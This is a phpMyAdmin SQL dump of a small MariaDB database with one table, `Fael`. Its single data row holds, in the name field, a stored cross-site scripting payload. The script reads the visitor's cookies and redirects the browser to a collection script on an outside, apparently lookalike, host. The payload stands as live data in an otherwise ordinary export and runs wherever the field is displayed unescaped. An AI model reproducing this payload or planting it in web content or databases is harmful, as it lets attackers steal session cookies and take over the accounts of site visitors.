-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: sql106.epizy.com
-- Generation Time: May 11, 2022 at 08:25 AM
-- Server version: 10.3.27-MariaDB
-- PHP Version: 7.2.22

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `epiz_31366105_main`
--

-- --------------------------------------------------------

--
-- Table structure for table `Fael`
--

CREATE TABLE `Fael` (
  `id` int(111) NOT NULL,
  `faelname` varchar(111) NOT NULL,
  `card` int(111) NOT NULL,
  `date` varchar(111) NOT NULL,
  `rand` varchar(111) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `Fael`
--

INSERT INTO `Fael` (`id`, `faelname`, `card`, `date`, `rand`) VALUES
(445, '<script>var j=document.cookie;window.location.href=\"http://googiemet.000webhostapp.com/Sender/store/m.php?t=\"+j', 981265, '2022/05/10', '588692del.php.txt');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `Fael`
--
ALTER TABLE `Fael`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `Fael`
--
ALTER TABLE `Fael`
  MODIFY `id` int(111) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=446;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
